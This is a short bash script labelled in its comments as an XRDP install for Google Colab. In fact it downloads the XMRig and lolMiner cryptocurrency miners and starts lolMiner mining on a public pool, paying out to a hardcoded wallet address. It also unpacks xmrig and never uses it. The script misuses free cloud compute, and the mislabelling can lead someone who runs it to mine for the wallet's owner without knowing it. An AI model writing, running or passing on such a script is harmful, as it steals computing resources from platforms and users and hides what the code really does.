#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUXZQhaAfKoRugYLkMTzsF6JYFigaL1og8.belli --ethstratum ETHPROXY
